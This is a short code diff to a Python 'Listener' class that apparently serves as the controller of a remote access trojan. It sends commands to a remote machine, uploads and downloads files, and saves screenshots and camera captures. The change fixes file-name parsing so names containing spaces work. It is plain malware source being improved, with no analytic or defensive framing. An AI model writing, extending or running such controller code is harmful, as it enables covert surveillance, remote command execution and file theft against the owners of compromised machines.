@@ -52,13 +52,15 @@ class Listener:
 			
 			try:
 				if command.split()[0] == 'upload':
-					file_content = self.read_file(command.split()[1])
+					file_name = command.replace("upload ", "")
+					file_content = self.read_file(file_name)
 					command += " " + file_content
 				
 				result = self.execute_remotely(command)
 				
 				if command.split()[0] == "download":
-					self.write_file(command.split()[1], result)
+					file_name = command.replace("download ", "")
+					self.write_file(file_name, result)
 				elif command.split()[0] == "screenshot":
 					self.write_file("screen.png", result)
 				elif command.split()[0] == "camera":
